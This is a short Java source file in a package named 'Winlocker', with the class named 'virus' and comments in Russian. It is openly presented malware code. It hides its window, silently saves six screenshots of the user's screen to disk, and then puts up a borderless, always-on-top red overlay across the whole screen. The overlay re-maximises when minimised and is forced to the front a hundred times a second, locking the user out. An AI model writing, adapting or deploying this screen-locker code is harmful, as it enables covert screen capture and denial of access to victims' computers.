package Winlocker;

import java.awt.*;
import java.io.*;
import java.awt.event.*;
import java.awt.image.*;
import javax.imageio.*;
import javax.swing.*;

public class virus {

	public static void main(String[] args) {
		new myFrame(); //Создаем объект окна
	}
}
class myFrame extends JFrame
{
	private Robot rob;
	private Timer tm;
	private int kol=0; //счетчик скриншотов
	private Frame wnd; //окно для блокировки

public myFrame()
{
	try 
	{
		rob = new Robot();
	}
	catch (Exception e) {}
	
	tm = new Timer(1000, new ActionListener(){
		public void actionPerformed(ActionEvent e){
			saveScreen(); //Снимаем скриншот экрана и записываем его в файл
		}
	});
	tm.start();
	
	//НЕ завершать работу приложения при закрытии окна
	setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
	//Выводим окно
	setVisible(true);
	//И сразу его прячем
	setVisible(false);
}
//Метод снятия скриншота экрана и сохранения его в файл
private void saveScreen()
{
	kol++; //Считаем количество скриншотов
	Dimension dm = Toolkit.getDefaultToolkit().getScreenSize(); //Текущее разрешение экрана
	int w = dm.width;
	int h = dm.height;
	
	try
	{
		//Снимает скриншот экрана
		BufferedImage img = rob.createScreenCapture(new Rectangle(0,0,w,h)); //Отступ слева, отступ сверху, ширина и высота
		//Сохраняет изображение в png файле
		ImageIO.write(img, "PNG", new File("c:\\java\\img"+kol+".png"));
	}
	catch (Exception e) {}
	
	if (kol==6)
	{
		tm.stop();
		
		wnd = new Frame();
		//Отключаем возможность изменения размеров окна
		wnd.setResizable(false);
		wnd.setBounds(0,0,w,h);
		wnd.setBackground(Color.RED);
		//Размещаем окно поверх других окон
		wnd.setAlwaysOnTop(true);
		//Убираем рамку окна
		wnd.setUndecorated(true);
		//Прозрачность 50%
		wnd.setOpacity(0.5f);
		
		//Подключаем обработчик события 
		wnd.addWindowListener(new WindowAdapter() {
			//При сворачивании окна
			public void windowIconified(WindowEvent arg0) {
				//Открываем окно на полный экран
				wnd.setExtendedState(Frame.MAXIMIZED_BOTH);
			}
		});
		wnd.setVisible(true);
		
		//Таймер с задержкой в 10 миллисекунд (100 раз в секунду)
		tm = new Timer(10, new ActionListener() {
			public void actionPerformed(ActionEvent e) {
				//Выводим окно на задний план
				wnd.toFront();
				
			}
		});
		tm.start();
	}
}
}
